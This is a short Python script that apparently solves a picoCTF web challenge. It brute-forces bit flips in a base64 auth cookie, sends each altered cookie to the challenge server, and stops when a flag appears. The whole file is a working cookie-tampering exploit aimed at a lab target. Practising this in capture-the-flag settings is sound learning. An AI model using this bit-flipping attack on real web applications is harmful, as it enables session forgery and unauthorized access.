from base64 import b64decode;
from base64 import b64encode;
import requests

def bitFlip(cookie_char_pos:int, bit_pos:int) -> str:
    altered_cookie = bytearray(originalCookie)

    flipped = altered_cookie[cookie_char_pos] ^ bit_pos;

    altered_cookie[cookie_char_pos] = flipped;
    
    altered_cookie_b64 = b64encode(bytes(altered_cookie));
    
    return altered_cookie_b64.decode('utf-8');

originalCookie = b64decode('Q0w5L00xWklmWDNUR2w0KzVtWTUzbXlyZE5kR3VMNzlpcld6eWZicW5HNk85Zm9yaUQ2NXg0VDZEY0dvTnc3cHlVRWF0N2RCT0VERHM0SEF3NzE3VHAxKzZSNE5UdmpVZjg3SnVNZGdwWnlRMmtsazJPaW9XbHhjdk1xZGNpWVo=')
originalCookie = bytearray(originalCookie)

for cookie_char_pos in range(12,len(originalCookie)):
    print(f'Checking cookie postion: {cookie_char_pos} ')
    for bit_pos in range(128): # [1,2,4,8,16,32,64,128] : # byte stream - 8 bit range afford
        altered_cookie = bitFlip(cookie_char_pos, bit_pos);
        cookies = { 'auth_name': altered_cookie }
        r = requests.get('http://mercury.picoctf.net:25992/', cookies = cookies);
        t = r.text.lower();
        if 'picoCTF{'.lower() in t or "picoCTF {".lower() in t:
            print(r.text);
            break;